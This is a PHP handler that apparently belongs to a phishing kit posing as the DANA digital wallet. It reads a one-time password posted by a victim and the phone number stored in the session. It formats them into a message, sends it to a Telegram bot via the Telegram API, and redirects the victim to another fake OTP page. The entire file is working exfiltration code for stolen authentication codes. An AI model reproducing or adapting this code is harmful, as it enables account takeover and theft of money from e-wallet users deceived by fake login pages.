<?php

session_start();
include "./telegram.php";

$otp2        = $_POST['otp2'];
$pin1        = $_SESSION['pin1'];
$phoneNumber = $_SESSION['phoneNumber'];

$_SESSION['otp2'] = $otp2;

$message = "
──────────────
DANA :Dompet Digital | ".$phoneNumber."
──────────────

• OTP : ".$otp2."

──────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../dana_otp/index.html');

?>